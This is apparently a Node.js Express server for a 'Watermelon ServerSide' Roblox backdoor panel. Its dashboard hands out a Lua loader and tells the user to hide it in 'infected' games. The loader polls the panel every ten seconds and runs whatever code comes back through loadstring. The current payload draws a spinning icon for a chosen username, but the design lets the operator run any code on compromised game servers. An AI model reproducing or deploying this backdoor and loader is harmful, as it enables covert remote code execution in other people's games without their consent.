const express = require('express');
const app = express();

app.use(express.json());

// Global variable to hold your targeted Roblox username
let targetUsername = "YourRobloxUsername"; 

// Complete Dashboard HTML/CSS/JS Interface
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Watermelon SS Panel</title>
        <style>
            body { background: #0f0f12; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; }
            .container { max-width: 800px; margin: 0 auto; background: #16161a; border-radius: 12px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
            
            /* Header & Spinning Watermelon */
            .header { display: flex; align-items: center; justify-content: space-between; border-bottom: 2px solid #24242b; padding-bottom: 15px; margin-bottom: 20px; }
            .logo-area { display: flex; align-items: center; gap: 15px; }
            .watermelon-logo { font-size: 40px; display: inline-block; animation: spin 4s linear infinite; }
            @keyframes spin { 100% { transform: rotate(360deg); } }
            
            /* Tabs Configuration */
            .tabs { display: flex; gap: 10px; margin-bottom: 20px; }
            .tab-btn { background: #24242b; border: none; color: #aaa; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.2s; }
            .tab-btn.active, .tab-btn:hover { background: #4caf50; color: #fff; }
            .tab-content { display: none; background: #1a1a22; padding: 20px; border-radius: 8px; border: 1px solid #24242b; min-height: 200px; }
            .tab-content.active { display: block; }
            
            /* Elements Layout */
            input, button { padding: 12px; border-radius: 6px; border: none; font-size: 14px; }
            input { background: #24242b; color: #fff; width: 70%; margin-right: 10px; }
            .action-btn { background: #4caf50; color: white; cursor: pointer; font-weight: bold; }
            .action-btn:hover { background: #45a049; }
            pre { background: #0f0f12; padding: 15px; border-radius: 6px; color: #00ff00; overflow-x: auto; font-family: monospace; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="logo-area">
                    <span class="watermelon-logo">🍉</span>
                    <h2>Watermelon ServerSide Panel</h2>
                </div>
                <div>Status: <span style="color:#4caf50;">● Connected</span></div>
            </div>

            <!-- Navigation Tabs -->
            <div class="tabs">
                <button class="tab-btn active" onclick="switchTab('dashboard')">Dashboard</button>
                <button class="tab-btn" onclick="switchTab('scripts')">Scripts</button>
                <button class="tab-btn" onclick="switchTab('games')">Games</button>
            </div>

            <!-- Dashboard Content -->
            <div id="dashboard" class="tab-content active">
                <h3>Account Settings</h3>
                <p>Set your real Roblox username here. When you join any infected game, the Watermelon SS will instantly load exclusively for you.</p>
                <div style="margin-top: 20px;">
                    <input type="text" id="usernameInput" value="${targetUsername}" placeholder="Enter Roblox Username">
                    <button class="action-btn" onclick="updateUsername()">Save Username</button>
                </div>
            </div>

            <!-- Scripts Content -->
            <div id="scripts" class="tab-content">
                <h3>ServerSide Script Executor</h3>
                <p>Copy this loader script and hide it inside a model or script in your infected game:</p>
                <pre>-- Watermelon SS Infected Game Loader\nlocal url = "${req.protocol}://${req.get('host')}/payload"\nlocal http = game:GetService("HttpService")\n\nwhile true do\n    local success, response = pcall(function()\n        return http:GetAsync(url)\n    end)\n    if success and response then\n        local func, err = loadstring(response)\n        if func then pcall(func) end\n    end\n    task.wait(10)\nend</pre>
            </div>

            <!-- Games Content -->
            <div id="games" class="tab-content">
                <h3>Infected Game Connections</h3>
                <p>Below are active servers currently running your background loader script:</p>
                <div style="background:#24242b; padding:15px; border-radius:6px; color:#aaa; font-style:italic;">
                    Monitoring active game loops... awaiting injection triggers.
                </div>
            </div>
        </div>

        <script>
            function switchTab(tabId) {
                document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
                document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
                document.getElementById(tabId).classList.add('active');
                event.target.classList.add('active');
            }

            function updateUsername() {
                const user = document.getElementById('usernameInput').value;
                fetch('/update-user', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: user })
                }).then(res => res.json())
                  .then(data => alert('Target Username Updated to: ' + data.currentUsername));
            }
        </script>
    </body>
    </html>
    `);
});

// Endpoint to change your saved Roblox username
app.post('/update-user', (req, res) => {
    if (req.body.username) {
        targetUsername = req.body.username;
    }
    res.json({ success: true, currentUsername: targetUsername });
});

// Endpoint that the infected game continuously pings for payloads
app.get('/payload', (req, res) => {
    // This Lua payload runs instantly inside the Roblox server when called
    const luaPayload = `
        local targetUser = "${targetUsername}"
        
        game.Players.PlayerAdded:Connect(function(player)
            if player.Name == targetUser then
                -- Build UI Layer
                local sg = Instance.new("ScreenGui")
                sg.Name = "WatermelonSS_Indicator"
                sg.ResetOnSpawn = false
                sg.Parent = player:WaitForChild("PlayerGui")
                
                -- Create Logo Icon
                local label = Instance.new("TextLabel")
                label.Size = UDim2.new(0, 80, 0, 80)
                label.Position = UDim2.new(0, 20, 1, -100) -- Bottom Left Side
                label.BackgroundTransparency = 1
                label.Text = "🍉"
                label.TextSize = 50
                label.AnchorPoint = Vector2.new(0.5, 0.5)
                label.Parent = sg
                
                -- Smooth Continuous Spinning Loop
                local rotation = 0
                game:GetService("RunService").Heartbeat:Connect(function(dt)
                    rotation = (rotation + (90 * dt)) % 360 -- Spins 90 degrees every second
                    label.Rotation = rotation
                end)
                
                print("Watermelon ServerSide successfully initialized for user: " .. targetUser)
            end
        end)
    `;
    res.set('Content-Type', 'text/plain');
    res.send(luaPayload);
});

module.exports = app;
